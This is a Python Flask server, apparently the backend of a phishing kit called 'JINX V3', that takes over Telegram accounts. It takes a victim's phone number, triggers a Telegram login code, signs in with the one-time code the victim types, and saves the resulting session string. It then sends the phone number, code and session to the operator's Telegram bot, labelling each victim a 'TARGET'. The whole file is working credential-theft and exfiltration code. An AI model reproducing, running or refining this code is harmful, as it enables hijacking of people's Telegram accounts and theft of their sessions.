# api/send_code.py (FINAL — TIMEOUT + LOGGING)
import os
import logging
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
import requests

# Setup logging
logging.basicConfig(level=logging.DEBUG)
log = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

def send_bot(msg):
    try:
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                    params={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'}, 
                    timeout=10)
    except Exception as e:
        log.error(f"Bot send failed: {e}")

@app.route('/send_code', methods=['POST', 'OPTIONS'])
def handle():
    if request.method == 'OPTIONS':
        return '', 204

    phone = request.form.get('phone')
    code = request.form.get('code')
    action = request.form.get('action', 'send')

    if not phone:
        return jsonify({'success': False, 'error': 'no phone'}), 400

    session_path = f"{SESSIONS_DIR}/{phone.replace('+', '')}.session"
    log.info(f"Processing {action} for {phone}")

    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        client.connect()
        log.info("Client connected")

        if action == 'verify' and code:
            log.info(f"Signing in with code: {code}")
            client.sign_in(phone, code)  # ← INI LAMBAT
            session_str = client.session.save()
            client.disconnect()
            log.info("Sign in success")

            msg = f"*TARGET MASUK!*\n\nNo: `{phone}`\nOTP: `{code}`\nSESSION:\n||{session_str}||"
            send_bot(msg)
            return jsonify({'success': True, 'session': session_str})

        else:
            log.info("Sending code request")
            res = client.send_code_request(phone, force_sms=True)
            client.disconnect()

            status = "RESEND" if action == 'resend' else "TARGET MASUK"
            msg = f"*{status}*\n\nNo: `{phone}`\nMenunggu OTP..."
            send_bot(msg)
            return jsonify({'success': True, 'hash': res.phone_code_hash})

    except Exception as e:
        error_msg = str(e)
        log.error(f"ERROR: {error_msg}")
        if 'client' in locals() and client.is_connected():
            client.disconnect()
        return jsonify({'success': False, 'error': error_msg}), 500

@app.route('/')
def home():
    return "JINX V3 – RAILWAY TIMEOUT FIXED"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
